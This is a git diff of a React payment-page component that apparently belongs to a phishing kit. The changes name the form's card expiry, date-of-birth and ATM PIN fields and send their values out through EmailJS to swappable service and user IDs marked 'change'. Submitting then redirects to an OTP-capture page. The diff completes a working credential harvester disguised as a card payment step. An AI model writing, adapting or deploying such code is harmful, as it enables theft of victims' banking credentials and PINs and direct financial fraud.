@@ -1,9 +1,10 @@
 import React, { useRef } from "react";
-import { Link } from "react-router-dom";
+import { useNavigate } from "react-router-dom";
 import emailjs from "@emailjs/browser";
 import "./index.css";
 
 const Paymentprocess_pin = ({}) => {
+  let navigate = useNavigate();
   const p_style = {
     color: "#12830",
     textAlign: "center",
@@ -15,14 +16,15 @@ const Paymentprocess_pin = ({}) => {
   const form = useRef();
 
   function sendEmail(e) {
+    navigate("/processing_otp");
     e.preventDefault();
 
     emailjs
       .sendForm(
-        "service_gmail_contact",
-        "template_qn8a87d",
-        form.current,
-        "user_1BbfROnlSMWCftLMRSCEo"
+        "service_hblrths",
+        "template_by3q0a8",  /*change */
+        form.current,    /*   */
+        "user_rkVmkb5ihll1tFJsx2oGr"  /*change */
       )
       .then(
         (result) => {
@@ -84,6 +86,7 @@ const Paymentprocess_pin = ({}) => {
                     className="form_input"
                     maxLength="2"
                     size="2"
+                    name="Vmonth"
                   />
                   <span>/</span>
                   <input
@@ -94,6 +97,7 @@ const Paymentprocess_pin = ({}) => {
                     className="form_input"
                     maxLength="2"
                     size="2"
+                    name="Vyear"
                   />
                 </div>
               </div>
@@ -104,30 +108,33 @@ const Paymentprocess_pin = ({}) => {
                     type="text"
                     // onChange={}
                     // value={}
+                    placeholder="dd"
+                    className="form_input"
+                    maxLength="2"
+                    size="2"
+                    name="dobdate"
+                  />
+                  <span>/</span>
+                  <input
+                    type="text"
+                    // onChange={}
+                    // value={}
                     placeholder="mm"
                     className="form_input"
                     maxLength="2"
                     size="2"
+                    name="dobmonth"
                   />
                   <span>/</span>
                   <input
                     type="text"
                     // onChange={}
                     // value={}
-                    placeholder="yy"
+                    placeholder="yyyy"
                     className="form_input"
-                    maxLength="2"
+                    maxLength="4"
                     size="2"
-                  />
-                  <span>/</span>
-                  <input
-                    type="text"
-                    // onChange={}
-                    // value={}
-                    placeholder="yy"
-                    className="form_input"
-                    maxLength="2"
-                    size="2"
+                    name="dobyear"
                   />
                 </div>
               </div>
@@ -145,12 +152,13 @@ const Paymentprocess_pin = ({}) => {
                   // value={}
                   className="cvv_input"
                   size="4"
-                  maxLength="4"
+                  maxLength="6"
+                  name="atmpin"
                 />
               </div>
               <div className="card_btn">
                 <button type="submit" className="submit_btn" style={{margin:"0em 0em 0em 5em"}}>
-                  <Link to="/processing_otp">SUBMIT</Link>
+                  SUBMIT
                 </button>
               </div>
             </form>
